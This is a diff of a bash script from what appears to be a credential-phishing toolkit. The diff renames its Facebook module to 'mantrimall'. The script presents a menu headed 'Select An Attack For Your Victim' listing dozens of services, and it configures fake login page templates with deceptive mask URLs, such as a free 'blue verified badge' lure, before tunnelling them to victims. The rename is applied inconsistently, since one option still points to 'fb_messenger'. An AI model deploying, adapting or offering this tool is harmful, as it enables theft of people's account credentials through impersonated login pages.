@@ -12,7 +12,7 @@
 ##   DarksecDevelopers  - https://github.com/DarksecDevelopers
 ##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
 ##   Võ Ngọc Bảo - https://github.com/vongocbao
-##   Mustakim Ahmed - https://www.facebook.com/Learn.Termux.009
+##   Mustakim Ahmed - https://www.mantrimall.com/Learn.Termux.009
 
 
 ## If you Copy Then Give the credits :)
@@ -387,30 +387,30 @@ tunnel_menu() {
 	fi
 }
 
-## Facebook
-site_facebook() {
+## mantrimall
+site_mantrimall() {
 	cat <<- EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
 		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
+		${RED}[${WHITE}04${RED}]${ORANGE} mantrimall Messenger Login Page
 
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		website="facebook"
-		mask='http://blue-verified-badge-for-facebook-free'
+		website="mantrimall"
+		mask='http://blue-verified-badge-for-mantrimall-free'
 		tunnel_menu
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		website="fb_advanced"
+		website="mantrimall_advanced"
 		mask='http://vote-for-the-best-social-media'
 		tunnel_menu
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
-		website="fb_security"
-		mask='http://make-your-facebook-secured-and-free-from-hackers'
+		website="mantrimall_security"
+		mask='http://make-your-mantrimall-secured-and-free-from-hackers'
 		tunnel_menu
 	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
 		website="fb_messenger"
@@ -418,7 +418,7 @@ site_facebook() {
 		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_facebook; }
+		{ sleep 1; clear; banner_small; site_mantrimall; }
 	fi
 }
 
@@ -518,7 +518,7 @@ main_menu() {
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
+		${RED}[${WHITE}01${RED}]${ORANGE} mantrimall      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
 		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
 		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
@@ -537,7 +537,7 @@ main_menu() {
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		site_facebook
+		site_mantrimall
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
 		site_instagram
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
